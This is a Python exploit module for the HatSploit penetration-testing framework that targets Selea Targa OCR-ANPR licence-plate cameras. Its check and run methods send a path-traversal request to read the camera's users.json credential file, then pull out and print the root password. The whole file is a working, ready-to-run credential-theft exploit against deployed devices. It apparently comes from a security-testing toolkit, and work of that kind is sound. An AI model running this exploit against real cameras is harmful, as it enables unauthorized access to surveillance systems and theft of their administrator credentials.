"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import json

from hatsploit.lib.core.module.basic import *
from hatsploit.lib.core.module.proto import HTTP


class HatSploitModule(Module, HTTP):
    def __init__(self):
        super().__init__({
            'Category': "exploit",
            'Name': "Selea Targa OCR-ANPR Camera Password Disclosure",
            'Module': "exploit/linux/selea/targa_anpr_password_disclosure",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - module developer",
                "LiquidWorm - vulnerability researcher",
            ],
            'Description': (
                "Selea Targa OCR-ANPR multiple models have a vulnerability that leads "
                "to a password disclosure."
            ),
            'Platform': OS_LINUX,
            'Rank': HIGH_RANK,
            'Devices': [
                "Selea iZero",
                "Selea Targa 512",
                "Selea Targa 504",
                "Selea Targa Semplice",
                "Selea Targa 704 TKM",
                "Selea Targa 805",
                "Selea Targa 710 INOX",
                "Selea Targa 750",
                "Selea Targa 704 ILB"
            ],
            'References': [
                {'URL': 'https://www.exploit-db.com/exploits/49456'},
                {'EDB': 49456}
            ],
            'DisclosureDate': "2021-01-22",
            'Notes': {
                'Stability': [CRASH_SAFE],
                'Reliability': [],
                'SideEffects': [],
            }
        })

        self.username = Option('USER', "admin", "Default username.", True)

    def check(self):
        response = self.http_request(
            method="GET",
            path='/CFCARD/images/SeleaCamera/../../../../../../../../../../mnt/data/auth/users.json',
        )

        if response and response.status_code == 200:
            return True

        return False

    def run(self):
        response = self.http_request(
            method="GET",
            path='/CFCARD/images/SeleaCamera/../../../../../../../../../../mnt/data/auth/users.json',
        )

        try:
            creds = json.loads(response.text)
            password = creds['root_pwd']

            self.print_table(
                "Credentials", ('Username', 'Password'), (self.username.value, password)
            )
        except Exception:
            self.print_warning(
                f"Target vulnerable, but default username is not {self.username.value}."
            )
